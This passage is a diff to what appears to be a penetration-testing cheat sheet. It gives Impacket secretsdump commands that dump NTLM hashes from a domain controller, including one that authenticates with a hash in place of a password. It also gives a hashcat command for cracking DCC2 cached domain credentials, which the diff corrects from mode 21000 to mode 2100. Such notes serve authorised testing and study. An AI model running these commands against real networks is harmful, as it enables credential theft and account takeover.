@@ -24,8 +24,8 @@ secretsdump.py DOMAIN/user:'Password'@<DC-IP> -just-dc-ntlm
 # Using hash instead of password
 secretsdump.py DOMAIN/user@<ip> -hashes :<NTLM-hash>
 
-# DCC2 hashes need this mode in hashcat
-hashcat -m 21000 dcc2.hashes /usr/share/wordlists/rockyou.txt --force
+# DCC2 (cached domain creds) hashes need this mode in hashcat
+hashcat -m 2100 dcc2.hashes /usr/share/wordlists/rockyou.txt
 ```
 
 Output field order: `username:RID:LM-hash:NT-hash:::`
